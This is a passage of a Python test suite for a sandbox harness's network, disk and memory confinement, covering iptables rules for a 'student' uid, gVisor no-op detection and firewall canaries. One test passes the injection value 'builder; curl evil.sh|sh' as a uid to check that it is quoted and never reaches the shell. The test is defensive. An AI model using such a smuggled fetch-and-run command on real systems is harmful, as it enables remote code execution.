            "iptables-legacy -A OUTPUT -m owner --uid-owner 900 -j DROP",
            "ip6tables-legacy -A OUTPUT -m owner --uid-owner 900 -j DROP",
        ]

    def test_gvisor_success_is_no_evidence_either(self, iptables: FakeIptables) -> None:
        """On GKE gVisor accepts iptables rules with exit code 0 and then
        enforces nothing, so success there must not be reported as cut off."""
        assert not Confinement(Sandbox.GVISOR).deny_all_network(900)
        assert iptables.rules != []

    def test_a_hostile_uid_never_reaches_the_shell(
        self, iptables: FakeIptables
    ) -> None:
        _ = Confinement(Sandbox.FIRECRACKER).deny_all_network(
            "builder; curl evil.sh|sh"
        )

        assert all(
            "--uid-owner 'builder; curl evil.sh|sh' -j" in rule
            for rule in iptables.rules
        )

    def test_gvisor_reports_the_rules_did_not_take(
        self, iptables: FakeIptables
    ) -> None:
        """Where iptables is a no-op the caller has to hear about it, since a
        uid it believes is cut off is otherwise wide open."""
        iptables.fails = "iptables-legacy"

        assert not Confinement(Sandbox.GVISOR).deny_all_network(900)

    def test_a_real_kernel_refusing_a_rule_is_fatal(
        self, iptables: FakeIptables
    ) -> None:
        iptables.fails = "ip6tables"

        with pytest.raises(RuntimeError, match="failed to apply firewall rule"):
            _ = Confinement(Sandbox.FIRECRACKER).deny_all_network(900)

    def test_outside_a_container_there_is_nothing_to_deny(
        self, iptables: FakeIptables, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("KAROTTE_CONTAINERIZED")

        assert not Confinement(Sandbox.FIRECRACKER).deny_all_network(900)
        assert iptables.rules == []


class TestRestrictToInternalNetwork:
    def block(
        self,
        iptables: FakeIptables,
        blocked_ports: list[int] | None = None,
        allowed_ips: list[str] | None = None,
    ) -> list[str]:
        _ = Confinement(Sandbox.FIRECRACKER).restrict_to_internal_network(
            "student", blocked_ports, allowed_ips
        )
        return iptables.rules

    def test_the_rules_name_the_given_uid(self, iptables: FakeIptables) -> None:
        _ = Confinement(Sandbox.FIRECRACKER).restrict_to_internal_network(900)

        assert all("-m owner --uid-owner 900" in rule for rule in iptables.rules)

    def test_a_real_kernel_reports_the_rules_took(self, iptables: FakeIptables) -> None:
        assert Confinement(Sandbox.FIRECRACKER).restrict_to_internal_network(900)
        assert iptables.rules != []

    def test_gvisor_success_is_no_evidence_either(self, iptables: FakeIptables) -> None:
        assert not Confinement(Sandbox.GVISOR).restrict_to_internal_network(900)
        assert iptables.rules != []

    def test_every_rule_names_the_student(self, iptables: FakeIptables) -> None:
        """The firewall is per-uid, so a rule that forgets the owner match
        would confine the whole container instead."""
        assert all(
            "-m owner --uid-owner student" in rule for rule in self.block(iptables)
        )

    def test_both_families_end_in_a_reject(self, iptables: FakeIptables) -> None:
        rules = self.block(iptables)

        assert rules[-1] == "ip6tables -A OUTPUT -m owner --uid-owner student -j REJECT"
        assert "iptables -A OUTPUT -m owner --uid-owner student -j REJECT" in rules[:-1]

    def test_blocked_ports_come_before_the_localhost_allowance(
        self, iptables: FakeIptables
    ) -> None:
        rules = self.block(iptables, blocked_ports=[8123])

        assert rules[0].endswith("-p tcp --dport 8123 -j DROP")
        assert rules[1].endswith("-d 127.0.0.0/8 -j ACCEPT")

    def test_allowed_ips_are_accepted(self, iptables: FakeIptables) -> None:
        rules = self.block(iptables, allowed_ips=["1.2.3.4"])

        assert (
            "iptables -A OUTPUT -m owner --uid-owner student -d 1.2.3.4 -j ACCEPT"
            in rules
        )

    def test_outside_a_container_no_rules_are_applied(
        self, iptables: FakeIptables, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("KAROTTE_CONTAINERIZED")

        assert self.block(iptables) == []

    @pytest.mark.parametrize("value", [None, "", "strict", "nonsense"])
    def test_by_default_only_localhost_own_addresses_and_allowed_ips_get_through(
        self, iptables: FakeIptables, monkeypatch: pytest.MonkeyPatch, value: str | None
    ) -> None:
        """The link-local and private ranges hold the metadata server and its
        credentials, other workloads, and on a developer machine the machine
        itself. An unknown value fails closed."""
        if value is None:
            monkeypatch.delenv(STUDENT_NETWORK_ENV_VAR, raising=False)
        else:
            monkeypatch.setenv(STUDENT_NETWORK_ENV_VAR, value)
        assert Confinement(Sandbox.VM).restrict_to_internal_network(
            "student", [8001], ["1.2.3.4"]
        )

        accepted = sorted(
            r.split(" -d ")[1] for r in iptables.rules if r.endswith("ACCEPT")
        )
        assert accepted == [
            "1.2.3.4 -j ACCEPT",
            "10.1.2.3 -j ACCEPT",
            "127.0.0.0/8 -j ACCEPT",
            "2001:db8::5 -j ACCEPT",
            "::1 -j ACCEPT",
        ]
        # The harness ports stay closed on every address, own ones included.
        assert iptables.rules[0].endswith("-p tcp --dport 8001 -j DROP")
        assert iptables.rules[-1] == (
            "ip6tables -A OUTPUT -m owner --uid-owner student -j REJECT"
        )

    def test_internal_opens_the_private_ranges(
        self, iptables: FakeIptables, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(STUDENT_NETWORK_ENV_VAR, "internal")
        rules = self.block(iptables)

        assert any(r.endswith("-d 10.0.0.0/8 -j ACCEPT") for r in rules)
        assert any(r.endswith("-d 169.254.169.254 -j ACCEPT") for r in rules)
        # Looser than strict everywhere: an own address that isn't private
        # stays reachable too.
        assert any(r.endswith("-d 10.1.2.3 -j ACCEPT") for r in rules)
        assert any(r.endswith("-d 2001:db8::5 -j ACCEPT") for r in rules)


def test_own_addresses_skip_loopback_and_link_local(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def addr(family: int, address: str) -> SimpleNamespace:
        return SimpleNamespace(family=family, address=address)

    fake = {
        "lo": [addr(socket.AF_INET, "127.0.0.1"), addr(socket.AF_INET6, "::1")],
        "eth0": [
            addr(socket.AF_INET, "192.168.64.7"),
            addr(socket.AF_INET6, "fe80::1%eth0"),
            addr(socket.AF_INET6, "fd48::7"),
            addr(psutil.AF_LINK, "f6:83:a8:5b:44:52"),
        ],
    }
    monkeypatch.setattr(psutil, "net_if_addrs", lambda: fake)

    assert confinement._own_addresses() == (["192.168.64.7"], ["fd48::7"])  # pyright: ignore[reportPrivateUsage]


class TestDefaultFileLimitBudget:
    """The default disk budget: detection, capped by the launcher's budget or
    else the hardware plugin's, in every sandbox."""

    HUGE_FREE: int = 6 * 1024**4
    BUDGET: int = 80 * GIB

    @pytest.fixture(autouse=True)
    def plugin(self, monkeypatch: pytest.MonkeyPatch) -> None:
        def limits(hardware: str) -> HardwareLimits | None:
            return HardwareLimits(disk_bytes=self.BUDGET) if hardware == "big" else None

        register_hardware_plugins(monkeypatch, limits={"a": limits})

    @pytest.fixture
    def workdir(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
        monkeypatch.setenv("KAROTTE_WORKDIR", str(tmp_path))
        monkeypatch.delenv(DISK_BUDGET_ENV_VAR, raising=False)
        monkeypatch.setattr(memory_watch, "disk_backed", _always_disk_backed)
        return tmp_path

    def _with_free(self, monkeypatch: pytest.MonkeyPatch, free: int) -> None:
        usage = shutil._ntuple_diskusage(total=free, used=0, free=free)  # pyright: ignore[reportPrivateUsage]
        monkeypatch.setattr(shutil, "disk_usage", lambda _path: usage)  # pyright: ignore[reportUnknownLambdaType]

    @pytest.mark.parametrize("sandbox", ["runc", "vm", "firecracker"])
    @pytest.mark.usefixtures("workdir")
    def test_detection_is_capped_to_the_plugin_budget(
        self, monkeypatch: pytest.MonkeyPatch, sandbox: str
    ) -> None:
        """In a VM too: Apple's 504G sparse rootfs would otherwise give a quota
        larger than the Mac's disk."""
        monkeypatch.setenv(SANDBOX_ENV_VAR, sandbox)
        self._with_free(monkeypatch, self.HUGE_FREE)
        limit = _default_file_limit("big")
        assert limit is not None
        assert limit.bytes == self.BUDGET

    @pytest.mark.usefixtures("workdir")
    def test_unknown_hardware_falls_back_to_detection(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(SANDBOX_ENV_VAR, "runc")
        self._with_free(monkeypatch, self.HUGE_FREE)
        limit = _default_file_limit("quantum-9000")
        assert limit is not None
        assert limit.bytes == int(self.HUGE_FREE * _FREE_DISK_FRACTION)

    @pytest.mark.usefixtures("workdir")
    def test_no_hardware_falls_back_to_detection(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(SANDBOX_ENV_VAR, "runc")
        self._with_free(monkeypatch, self.HUGE_FREE)
        limit = _default_file_limit(None)
        assert limit is not None
        assert limit.bytes == int(self.HUGE_FREE * _FREE_DISK_FRACTION)

    @pytest.mark.usefixtures("workdir")
    def test_detection_below_the_plugin_budget_wins(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(SANDBOX_ENV_VAR, "runc")
        small_free = 10 * GIB
        self._with_free(monkeypatch, small_free)
        limit = _default_file_limit("big")
        assert limit is not None
        assert limit.bytes == int(small_free * _FREE_DISK_FRACTION)

    @pytest.mark.usefixtures("workdir")
    def test_a_launcher_budget_replaces_the_plugin_budget(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The launcher saw the host's real free space; the plugin's budget is
        a guess for when nobody did."""
        monkeypatch.setenv(SANDBOX_ENV_VAR, "vm")
        monkeypatch.setenv(DISK_BUDGET_ENV_VAR, str(100 * GIB))
        self._with_free(monkeypatch, self.HUGE_FREE)
        limit = _default_file_limit("big")
        assert limit is not None
        assert limit.bytes == 100 * GIB

    @pytest.mark.parametrize("sandbox", ["vm", "firecracker", "runc"])
    @pytest.mark.usefixtures("workdir")
    def test_the_launcher_budget_caps_detection(
        self, monkeypatch: pytest.MonkeyPatch, sandbox: str
    ) -> None:
        monkeypatch.setenv(SANDBOX_ENV_VAR, sandbox)
        monkeypatch.setenv(DISK_BUDGET_ENV_VAR, str(20 * GIB))
        self._with_free(monkeypatch, self.HUGE_FREE)
        limit = _default_file_limit(None)
        assert limit is not None
        assert limit.bytes == 20 * GIB

    @pytest.mark.usefixtures("workdir")
    def test_the_launcher_budget_never_raises_detection(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(SANDBOX_ENV_VAR, "vm")
        monkeypatch.setenv(DISK_BUDGET_ENV_VAR, str(50 * GIB))
        small_free = 10 * GIB
        self._with_free(monkeypatch, small_free)
        limit = _default_file_limit(None)
        assert limit is not None
        assert limit.bytes == int(small_free * _FREE_DISK_FRACTION)

    @pytest.mark.parametrize("value", ["", "lots", "0", "-5"])
    @pytest.mark.usefixtures("workdir")
    def test_an_unusable_launcher_budget_is_ignored(
        self, monkeypatch: pytest.MonkeyPatch, value: str
    ) -> None:
        monkeypatch.setenv(SANDBOX_ENV_VAR, "vm")
        monkeypatch.setenv(DISK_BUDGET_ENV_VAR, value)
        self._with_free(monkeypatch, self.HUGE_FREE)
        limit = _default_file_limit("big")
        assert limit is not None
        assert limit.bytes == self.BUDGET


class TestSandboxMemory:
    """The sandbox's RAM: the plugin's number for the hardware, else what the
    cgroups above the student allow, else the machine's RAM, and nothing
    without a working cgroup."""

    @pytest.fixture(autouse=True)
    def in_a_container(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("KAROTTE_CONTAINERIZED", "1")
        register_hardware_plugins(monkeypatch, limits={"a": _small_hardware})
        monkeypatch.setattr(confinement, "_physical_memory_bytes", lambda: 32 * GIB)

    def test_a_vm_launchers_number_comes_before_the_cgroup(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A VM launcher holds headroom above the sandbox's RAM for the guest
        kernel; the VM's own cgroup or RAM would hand that to the student."""
        monkeypatch.setenv(SANDBOX_MEMORY_ENV_VAR, str(5 * GIB))
        assert confinement.sandbox_memory_bytes(None) == 5 * GIB

    @pytest.mark.parametrize("value", [GIB // 2, HARNESS_RESERVE_BYTES])
    def test_a_launchers_number_within_the_reserve_is_ignored(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, value: int
    ) -> None:
        """The student's limit is this less the harness reserve; zero or less
        would OOM-kill every student process."""
        self._cgroup(tmp_path, monkeypatch, str(12 * GIB))
        monkeypatch.setenv(SANDBOX_MEMORY_ENV_VAR, str(value))
        assert confinement.sandbox_memory_bytes(None) == 12 * GIB

    def _cgroup(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, container_max: str
    ) -> None:
        root = tmp_path / "cgroup"
        root.mkdir()
        (root / "cgroup.controllers").write_text("memory pids")
        (root / "cgroup.subtree_control").write_text("")
        (root / "memory.max").write_text(container_max)
        group = V2Cgroup(root).create("student")
        confined = CgroupConfinement(Sandbox.RUNC, group, 1000)
        monkeypatch.setattr(confinement, "get_confinement", lambda uid=None: confined)  # pyright: ignore[reportUnknownLambdaType]

    def test_the_plugin_knows_the_hardware(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._cgroup(tmp_path, monkeypatch, str(12 * GIB))
        assert sandbox_memory_bytes("small") == 5 * GIB

    def test_the_cgroup_limit_above_the_student(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._cgroup(tmp_path, monkeypatch, str(12 * GIB))
        assert sandbox_memory_bytes(None) == 12 * GIB
        assert sandbox_memory_bytes("made-up") == 12 * GIB

    def test_the_machine_ram_without_a_cgroup_limit(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._cgroup(tmp_path, monkeypatch, "max")
        assert sandbox_memory_bytes(None) == 32 * GIB

    def test_nothing_without_a_working_cgroup(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            confinement,
            "get_confinement",
            lambda uid=None: WatchdogConfinement(Sandbox.GVISOR, 1000),  # pyright: ignore[reportUnknownLambdaType]
        )
        assert sandbox_memory_bytes(None) is None

    def test_nothing_outside_a_container(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("KAROTTE_CONTAINERIZED")

        def refuse(uid: int | None = None) -> Confinement:
            raise AssertionError(f"built a confinement for {uid} on the host")

        monkeypatch.setattr(confinement, "get_confinement", refuse)
        assert sandbox_memory_bytes(None) is None

    def test_the_default_memory_limit_leaves_the_harness_its_reserve(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._cgroup(tmp_path, monkeypatch, str(12 * GIB))
        monkeypatch.setattr(confinement, "_default_file_limit", lambda _hw=None: None)  # pyright: ignore[reportUnknownLambdaType]

        contracts = apply_default_limits(None)

        assert contracts["memory"] == Contract.PREVENTED
        student = tmp_path / "cgroup" / "student"
        assert (student / "memory.max").read_text() == str(
            12 * GIB - HARNESS_RESERVE_BYTES
        )


class TestFirewallTolerance:
    def test_a_refused_rule_aborts_by_default(
        self, iptables: FakeIptables, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv(FIREWALL_TOLERATE_ENV_VAR, raising=False)
        iptables.fails = "ip6tables"

        with pytest.raises(RuntimeError, match="failed to apply firewall rule"):
            _ = Confinement(Sandbox.FIRECRACKER).deny_all_network(900)

    def test_a_refused_rule_is_reported_as_not_taken_when_tolerated(
        self, iptables: FakeIptables, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(FIREWALL_TOLERATE_ENV_VAR, "1")
        iptables.fails = "iptables -A"

        assert Confinement(Sandbox.FIRECRACKER).deny_all_network(900) is False

    def test_tolerance_changes_nothing_when_rules_take(
        self, iptables: FakeIptables, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(FIREWALL_TOLERATE_ENV_VAR, "1")

        assert Confinement(Sandbox.FIRECRACKER).deny_all_network(900)
        assert len(iptables.rules) == 2


class TestFirewallCanaries:
    def _route_table(self, tmp_path: Path, gateway_hex: str | None) -> Path:
        table = tmp_path / "route"
        rows = ["Iface\tDestination\tGateway\tFlags"]
        rows.append("eth0\t0040A8C0\t00000000\t0001")
        if gateway_hex is not None:
            rows.append(f"eth0\t00000000\t{gateway_hex}\t0003")
        _ = table.write_text("\n".join(rows) + "\n")
        return table

    def test_the_default_gateway_comes_from_the_route_table(
        self, tmp_path: Path
    ) -> None:
        # 192.168.64.1, little-endian as the kernel prints it
        table = self._route_table(tmp_path, "0140A8C0")
        assert confinement._default_gateway(table) == "192.168.64.1"  # pyright: ignore[reportPrivateUsage]
        assert confinement._default_gateway(self._route_table(tmp_path, None)) is None  # pyright: ignore[reportPrivateUsage]

    def test_a_default_route_without_a_gateway_has_none(self, tmp_path: Path) -> None:
        """An on-link default route lists 0.0.0.0, which reaches localhost."""
        table = tmp_path / "route"
        _ = table.write_text(
            "Iface\tDestination\tGateway\tFlags\neth0\t00000000\t00000000\t0001\n"
        )
        assert confinement._default_gateway(table) is None  # pyright: ignore[reportPrivateUsage]

    def test_strict_canaries_include_metadata_and_gateway(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv(STUDENT_NETWORK_ENV_VAR, raising=False)
        monkeypatch.setattr(confinement, "_default_gateway", lambda: "192.168.64.1")
        assert confinement.firewall_canaries() == [
            ("1.1.1.1", 80),
            ("169.254.169.254", 80),
            ("192.168.64.1", 80),
            ("192.168.64.1", 53),
        ]

    def test_allowed_ips_are_not_canaries(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A model proxy on the gateway (the Mac, under Apple `container`) is
        reachable by design; reaching it proves nothing about the firewall."""
        monkeypatch.delenv(STUDENT_NETWORK_ENV_VAR, raising=False)
        monkeypatch.setattr(confinement, "_default_gateway", lambda: "192.168.64.1")
        assert confinement.firewall_canaries(["192.168.64.1"]) == [
            ("1.1.1.1", 80),
            ("169.254.169.254", 80),
        ]

    def test_internal_canaries_are_public_only(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(STUDENT_NETWORK_ENV_VAR, "internal")
        assert confinement.firewall_canaries() == [("1.1.1.1", 80)]


@pytest.mark.requires_root
def test_reachable_as_connects_as_the_given_uid() -> None:
    """A listener only root may reach (via a uid-owner REJECT would need
    iptables), so check the plain path: the helper runs as the uid and reports
    a connection it made."""
    import socket as _socket

    server = _socket.socket()
    server.bind(("127.0.0.1", 0))
    server.listen()
    port = server.getsockname()[1]
    try:
        reached = confinement.reachable_as(
            65534, [("127.0.0.1", port), ("127.0.0.1", 1)]
        )
    finally:
        server.close()
    assert reached == [("127.0.0.1", port)]


class TestPrepareVmGuest:
    """In a VM, root makes the guest's read-only cgroupfs writable and creates
    missing loop device nodes, before any confinement is built."""

    @pytest.fixture
    def vm_root(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv(SANDBOX_ENV_VAR, "vm")
        monkeypatch.setenv("KAROTTE_CONTAINERIZED", "1")
        monkeypatch.setattr("karotte.confinement.os.geteuid", lambda: 0)

    def _mounts(self, monkeypatch: pytest.MonkeyPatch, read_only: bool) -> None:
        mount = cgroups.Mount(Path("/sys/fs/cgroup"), "cgroup2", frozenset(), read_only)
        monkeypatch.setattr(confinement, "read_mounts", lambda: [mount])

    @pytest.mark.usefixtures("vm_root")
    def test_a_read_only_cgroupfs_is_remounted_and_loop_nodes_created(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        self._mounts(monkeypatch, read_only=True)
        ran: list[list[str]] = []

        def fake_run(argv: list[str], **_: object) -> SimpleNamespace:
            ran.append(argv)
            return SimpleNamespace(returncode=0, stderr="")

        monkeypatch.setattr(subprocess, "run", fake_run)
        made: list[tuple[str, int]] = []
        monkeypatch.setattr(
            "karotte.confinement.os.mknod",
            lambda path, mode, device: made.append((Path(path).name, os.major(device))),  # pyright: ignore[reportUnknownLambdaType]
        )
        (tmp_path / "loop0").touch()

        changed = confinement.prepare_vm_guest(tmp_path)

        assert ran[0][-3:] == ["-o", "remount,rw", "/sys/fs/cgroup"]
        assert made[0] == ("loop-control", 10)
        assert ("loop0", 7) not in made
        assert ("loop7", 7) in made
        assert changed[0] == "remounted /sys/fs/cgroup read-write"

    @pytest.mark.usefixtures("vm_root")
    def test_a_writable_guest_is_left_alone(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        self._mounts(monkeypatch, read_only=False)
        for name in ["loop-control", *(f"loop{n}" for n in range(8))]:
            (tmp_path / name).touch()
        monkeypatch.setattr(subprocess, "run", pytest.fail)
        assert confinement.prepare_vm_guest(tmp_path) == []

    @pytest.mark.parametrize("sandbox", ["runc", "gvisor"])
    def test_other_sandboxes_are_left_alone(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path, sandbox: str
    ) -> None:
        monkeypatch.setenv(SANDBOX_ENV_VAR, sandbox)
        monkeypatch.setenv("KAROTTE_CONTAINERIZED", "1")
        monkeypatch.setattr("karotte.confinement.os.geteuid", lambda: 0)
        monkeypatch.setattr(confinement, "read_mounts", pytest.fail)
        assert confinement.prepare_vm_guest(tmp_path) == []
